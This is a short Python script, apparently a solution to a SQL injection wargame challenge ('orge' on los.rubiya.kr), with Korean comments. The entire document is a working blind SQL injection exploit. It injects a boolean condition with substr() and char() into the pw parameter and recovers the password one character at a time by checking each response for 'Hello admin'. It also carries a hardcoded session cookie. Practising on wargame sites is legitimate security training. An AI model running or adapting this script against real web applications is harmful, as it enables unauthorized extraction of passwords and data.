import urllib,requests


password=""


for j in range(1,9):                            # 1~8자리 패스워드를 찾아야함                                # 현재 몇번째 인지 표시
  for i in range(48,128):                       # 대부분의 글자들 다 찾아내기
    try:
      url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1%27%20||%20%271%27=%271%27%20%26%26%20substr(pw," + str(j) +",1)%20=%20char(" + str(i) + ")%23"
      r = requests.post(url,cookies=(dict(PHPSESSID="t3lssqi3a9enhffi1mac5amc65")))
    except:
      print("Error")
      continue
    if 'Hello admin' in r.text: 
      password = password + chr(i)
      print ("[+] PW " + str(j) + " : " + password)
      break